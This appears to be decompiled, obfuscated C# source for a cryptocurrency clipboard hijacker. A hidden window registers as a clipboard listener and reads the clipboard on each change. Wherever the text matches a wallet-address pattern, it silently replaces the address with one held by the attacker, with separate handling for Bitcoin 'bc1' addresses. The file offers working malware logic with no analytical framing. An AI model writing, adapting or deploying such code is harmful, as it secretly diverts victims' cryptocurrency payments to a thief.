using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

public sealed class GClass0
{
	public class GForm0 : Form
	{
		[CompilerGenerated]
		private sealed class Class3
		{
			public string string_0;

			public void method_0()
			{
				string_0 = Clipboard.GetText();
			}
		}

		[CompilerGenerated]
		private sealed class Class4
		{
			public string string_0;

			public void method_0()
			{
				Clipboard.SetText(string_0);
			}
		}

		private static string string_0 = smethod_0();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
				return createParams;
			}
		}

		public GForm0()
		{
			Class0.Class1.SetParent(((Control)this).get_Handle(), Class0.Class1.intptr_0);
			Class0.Class1.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool method_0(Regex regex_0)
		{
			if (regex_0.Match(string_0).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				string_0 = smethod_0();
				if (string_0.StartsWith("bc1"))
				{
					if (method_0(Class0.regex_0) && !string_0.Contains(Class0.string_13))
					{
						string string_ = Class0.regex_0.Replace(string_0, Class0.string_13);
						smethod_1(string_);
					}
				}
				else if (method_0(Class0.regex_0) && !string_0.Contains(Class0.string_11))
				{
					string string_2 = Class0.regex_0.Replace(string_0, Class0.string_11);
					smethod_1(string_2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string smethod_0()
		{
			string string_0 = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				string_0 = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return string_0;
		}

		public static void smethod_1(string string_1)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(string_1);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
